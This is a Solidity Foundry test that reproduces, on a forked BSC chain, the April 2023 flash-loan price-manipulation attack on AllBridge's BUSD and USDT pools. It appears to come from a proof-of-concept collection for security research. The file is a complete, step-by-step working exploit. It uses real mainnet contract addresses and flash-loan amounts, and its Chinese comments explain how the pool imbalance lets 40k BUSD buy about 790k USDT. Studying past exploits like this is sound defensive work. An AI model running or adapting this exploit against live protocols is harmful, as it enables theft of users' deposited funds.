// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : 550k US$
// Time : 2023-04-02

// @Analysis
// https://twitter.com/peckshield/status/1642356701100916736
// https://twitter.com/BeosinAlert/status/1642372700726505473
// https://m.freebuf.com/articles/blockchain-articles/363067.html
// @TX
// https://bscscan.com/tx/0x7ff1364c3b3b296b411965339ed956da5d17058f3164425ce800d64f1aef8210
// @Phalcon View
// https://explorer.phalcon.xyz/tx/bsc/0x7ff1364c3b3b296b411965339ed956da5d17058f3164425ce800d64f1aef8210
// @Summary
// https://twitter.com/gbaleeeee/status/1642520517788966915

// Root cause : FlashLoan price manipulation

interface IBridgeSwap {
    function swap(
        uint256 amount,
        bytes32 token,
        bytes32 receiveToken,
        address recipient
    ) external;
}

interface ISwap {
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external;
}

interface AllBridgePool {
    function tokenBalance() external view returns (uint256);

    function vUsdBalance() external view returns (uint256);

    function deposit(uint256 amount) external;

    function withdraw(uint256 amountLp) external;
}

contract Attacker is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IBridgeSwap BridgeSwap =
        IBridgeSwap(0x7E6c2522fEE4E74A0182B9C6159048361BC3260A);
    ISwap Swap = ISwap(0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0);
    AllBridgePool USDTPool =
        AllBridgePool(0xB19Cd6AB3890f18B662904fd7a40C003703d2554);
    AllBridgePool BUSDPool =
        AllBridgePool(0x179aaD597399B9ae078acFE2B746C09117799ca0);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_982_067);
        cheats.label(address(BUSD), "BUSD");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(BridgeSwap), "BridgeSwap");
        cheats.label(address(Swap), "Swap");
        cheats.label(address(USDTPool), "USDTPool");
        cheats.label(address(BUSDPool), "BUSDPool");
        cheats.label(address(Pair), "Pair");
    }

    // 发起攻击
    function testExploit() public {
        emit log_named_decimal_uint(
            "Attacker BUSD balance before exploit",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );

        // 闪电贷750万BUSD
        Pair.swap(0, 7_500_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker BUSD balance after exploit",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );
    }

    // 回调函数
    function pancakeCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) public {
        BUSD.approve(address(Swap), type(uint256).max);
        USDT.approve(address(Swap), type(uint256).max);
        BUSD.approve(address(BUSDPool), type(uint256).max);
        USDT.approve(address(USDTPool), type(uint256).max);

        // 兑换200万USDT
        Swap.swap(
            address(BUSD),
            address(USDT),
            2_003_300 * 1e18,
            1,
            address(this),
            block.timestamp
        );
        // 存储500万BUSD到BUSD池
        BUSDPool.deposit(5_000_000 * 1e18);
        // 再换50万USDT
        Swap.swap(
            address(BUSD),
            address(USDT),
            496_700 * 1e18,
            1,
            address(this),
            block.timestamp
        );
        // 存储200万USDT到USDT池
        USDTPool.deposit(2_000_000 * 1e18);

        // 查看池子中的BUSD和USDT数量以及两者比例
        console.log(
            "BUSDPool tokenBalance, BUSDPool vUsdBalance, BUSD/vUSD rate:",
            BUSDPool.tokenBalance(),
            BUSDPool.vUsdBalance(),
            BUSDPool.tokenBalance() / BUSDPool.vUsdBalance()
        );

        bytes32 token = bytes32(uint256(uint160(address(USDT))));
        bytes32 receiveToken = bytes32(uint256(uint160(address(BUSD))));
        // 利用AllBridge兑换手上的50万USDT为BUSD
        BridgeSwap.swap(
            USDT.balanceOf(address(this)),
            token,
            receiveToken,
            address(this)
        );

        // 查看池子中的BUSD和USDT数量以及两者比例
        console.log(
            "BUSDPool tokenBalance, BUSDPool vUsdBalance, BUSD/vUSD rate:",
            BUSDPool.tokenBalance(),
            BUSDPool.vUsdBalance(),
            BUSDPool.tokenBalance() / BUSDPool.vUsdBalance()
        );

        // 取出此前存入池子的500万BUSD(这里扣了些手续费等剩483万)
        // !!!也是这里加剧了池子中BUSD和USDT的不平衡
        BUSDPool.withdraw(4_830_262_616);

        // 查看池子中的BUSD和USDT数量以及两者比例
        console.log(
            "BUSDPool tokenBalance, BUSDPool vUsdBalance, BUSD/vUSD rate:",
            BUSDPool.tokenBalance(),
            BUSDPool.vUsdBalance(),
            BUSDPool.tokenBalance() / BUSDPool.vUsdBalance()
        );

        // 利用AllBridge兑换4万BUSD为USDT
        // 因为这时池子中的BUSD的数量刚被抽走,打破了平衡比例
        // 使得4万BUSD能兑换到79万的USDT
        BridgeSwap.swap(40_000 * 1e18, receiveToken, token, address(this));

        // 查看池子中的BUSD和USDT数量以及两者比例
        console.log(
            "BUSDPool tokenBalance, BUSDPool vUsdBalance, BUSD/vUSD rate:",
            BUSDPool.tokenBalance(),
            BUSDPool.vUsdBalance(),
            BUSDPool.tokenBalance() / BUSDPool.vUsdBalance()
        );

        // 取出此前存入池子的200万USDT(这里扣了些手续费等剩199.3万)
        USDTPool.withdraw(1_993_728_530);

        // 再将200万USDT兑换回BUSD,这里兑换走的就不是AllBridge上的BUSD池了
        Swap.swap(
            address(USDT),
            address(BUSD),
            USDT.balanceOf(address(this)),
            1,
            address(this),
            block.timestamp
        );
        // 归还闪电贷,攻击完毕,跑路
        BUSD.transfer(address(Pair), 7_522_500 * 1e18);
    }
}
